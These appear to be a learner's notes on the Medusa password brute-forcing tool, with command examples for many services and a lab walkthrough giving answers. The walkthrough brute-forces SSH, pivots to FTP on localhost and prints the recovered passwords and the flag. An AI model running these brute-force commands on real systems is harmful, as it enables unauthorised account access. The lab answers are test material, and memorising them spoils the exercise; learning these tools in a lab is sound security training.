# Medusa
## Command Syntax and Parameter Table

```sh
masterofblafu@htb[/htb]$ medusa [target_options] [credential_options] -M module [module_options]
```

<table class="bg-neutral-800 text-primary w-full"><thead class="text-left rounded-t-lg"><tr class="border-t-neutral-600 first:border-t-0 border-t"><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Parameter</th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Explanation</th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Usage Example</th></tr></thead><tbody class="font-mono text-sm"><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">-h HOST</code> or <code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">-H FILE</code></td><td class="p-4">Target options: Specify either a single target hostname or IP address (<code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">-h</code>) or a file containing a list of targets (<code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">-H</code>).</td><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">medusa -h 192.168.1.10 ...</code> or <code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">medusa -H targets.txt ...</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">-u USERNAME</code> or <code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">-U FILE</code></td><td class="p-4">Username options: Provide either a single username (<code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">-u</code>) or a file containing a list of usernames (<code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">-U</code>).</td><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">medusa -u admin ...</code> or <code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">medusa -U usernames.txt ...</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">-p PASSWORD</code> or <code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">-P FILE</code></td><td class="p-4">Password options: Specify either a single password (<code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">-p</code>) or a file containing a list of passwords (<code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">-P</code>).</td><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">medusa -p password123 ...</code> or <code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">medusa -P passwords.txt ...</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">-M MODULE</code></td><td class="p-4">Module: Define the specific module to use for the attack (e.g., <code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">ssh</code>, <code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">ftp</code>, <code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">http</code>).</td><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">medusa -M ssh ...</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">-m "MODULE_OPTION"</code></td><td class="p-4">Module options: Provide additional parameters required by the chosen module, enclosed in quotes.</td><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">medusa -M http -m "POST /login.php HTTP/1.1\r\nContent-Length: 30\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=^USER^&amp;password=^PASS^" ...</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">-t TASKS</code></td><td class="p-4">Tasks: Define the number of parallel login attempts to run, potentially speeding up the attack.</td><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">medusa -t 4 ...</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">-f</code> or <code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">-F</code></td><td class="p-4">Fast mode: Stop the attack after the first successful login is found, either on the current host (<code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">-f</code>) or any host (<code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">-F</code>).</td><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">medusa -f ...</code> or <code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">medusa -F ...</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">-n PORT</code></td><td class="p-4">Port: Specify a non-default port for the target service.</td><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">medusa -n 2222 ...</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">-v LEVEL</code></td><td class="p-4">Verbose output: Display detailed information about the attack's progress. The higher the <code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">LEVEL</code> (up to 6), the more verbose the output.</td><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">medusa -v 4 ...</code></td></tr></tbody></table>

## Medusa Module

<table class="bg-neutral-800 text-primary w-full"><thead class="text-left rounded-t-lg"><tr class="border-t-neutral-600 first:border-t-0 border-t"><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Medusa Module</th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Service/Protocol</th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Description</th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Usage Example</th></tr></thead><tbody class="font-mono text-sm"><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">FTP</td><td class="p-4">File Transfer Protocol</td><td class="p-4">Brute-forcing FTP login credentials, used for file transfers over a network.</td><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">HTTP</td><td class="p-4">Hypertext Transfer Protocol</td><td class="p-4">Brute-forcing login forms on web applications over HTTP (GET/POST).</td><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&amp;password=^PASS^</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">IMAP</td><td class="p-4">Internet Message Access Protocol</td><td class="p-4">Brute-forcing IMAP logins, often used to access email servers.</td><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">medusa -M imap -h mail.example.com -U users.txt -P passwords.txt</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">MySQL</td><td class="p-4">MySQL Database</td><td class="p-4">Brute-forcing MySQL database credentials, commonly used for web applications and databases.</td><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">POP3</td><td class="p-4">Post Office Protocol 3</td><td class="p-4">Brute-forcing POP3 logins, typically used to retrieve emails from a mail server.</td><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">RDP</td><td class="p-4">Remote Desktop Protocol</td><td class="p-4">Brute-forcing RDP logins, commonly used for remote desktop access to Windows systems.</td><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">SSHv2</td><td class="p-4">Secure Shell (SSH)</td><td class="p-4">Brute-forcing SSH logins, commonly used for secure remote access.</td><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">Subversion (SVN)</td><td class="p-4">Version Control System</td><td class="p-4">Brute-forcing Subversion (SVN) repositories for version control.</td><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">Telnet</td><td class="p-4">Telnet Protocol</td><td class="p-4">Brute-forcing Telnet services for remote command execution on older systems.</td><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">VNC</td><td class="p-4">Virtual Network Computing</td><td class="p-4">Brute-forcing VNC login credentials for remote desktop access.</td><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">medusa -M vnc -h 192.168.1.100 -P passwords.txt</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">Web Form</td><td class="p-4">Brute-forcing Web Login Forms</td><td class="p-4">Brute-forcing login forms on websites using HTTP POST requests.</td><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&amp;password=^PASS^:F=Invalid"</code></td></tr></tbody></table>

## Testing for Empty or Default Passwords

```sh
masterofblafu@htb[/htb]$ medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
```

This command instructs Medusa to:

- Target the host at `10.0.0.5`.
- Use the usernames from `usernames.txt`.
- Perform additional checks for empty passwords (`-e n`) and passwords matching the username (`-e s`).
- Use the appropriate service module (replace `service_name` with the correct module name).

## Questions
1. What was the password for the ftpuser? **Answer: qqww1122**
   - Identified SSH open the target:
        ```sh
        $ sudo nmap -sV -Pn -p 30158 154.57.164.69
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-13 23:43 CDT
        Nmap scan report for 154-57-164-72.static.isp.htb.systems (154.57.164.72)
        Host is up (0.15s latency).

        PORT      STATE SERVICE VERSION
        30893/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
        ```
   - Try to brute force ssh credentials for the `sshuser` account → found `sshuser`:`1q2w3e4r5t`
        ```sh
        $ medusa -h 154.57.164.69 -n 30158 -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3 -f
        <SNIP>
        ACCOUNT FOUND: [ssh] Host: 154.57.164.69 User: sshuser Password: 1q2w3e4r5t [SUCCESS]
        <SNIP>
        ```
   - SSH to the target with the found credentials and discover that FTP is open on the target machine:
        ```sh
        $ ssh -p 30158 sshuser@154.57.164.69
        sshuser@ng-1863259-loginbfservice-rihof-7b97d4bcfc-52hgr:~$ nmap localhost
        Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-14 07:50 UTC
        Nmap scan report for localhost (127.0.0.1)
        Host is up (0.00029s latency).
        Other addresses for localhost (not scanned): ::1
        Not shown: 998 closed ports
        PORT   STATE SERVICE
        21/tcp open  ftp
        22/tcp open  ssh

        Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
        ```
   - Run medusa itself on this machine → found the password for ftpuser: `qqww1122`
        ```sh
        sshuser@ng-1863259-loginbfservice-rihof-7b97d4bcfc-52hgr:~$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 3 -f
        Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
        <SNIP>
        ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ftpuser Password: qqww1122 [SUCCESS]
        <SNIP>
        ```  
2. After successfully brute-forcing the ssh session, and then logging into the ftp server on the target, what is the full flag found within flag.txt? **Answer: HTB{SSH_and_FTP_Bruteforce_Success}**
   - Login to ftp with the found credentials and read the flag:
        ```sh
        sshuser@ng-1863259-loginbfservice-rihof-7b97d4bcfc-52hgr:~$ ftp ftp://ftpuser:qqww1122@localhost
        Trying [::1]:21 ...
        Connected to localhost.
        220 (vsFTPd 3.0.5)
        331 Please specify the password.
        230 Login successful.
        Remote system type is UNIX.
        Using binary mode to transfer files.
        200 Switching to Binary mode.
        ftp> more flag.txt
        HTB{SSH_and_FTP_Bruteforce_Success}
        ```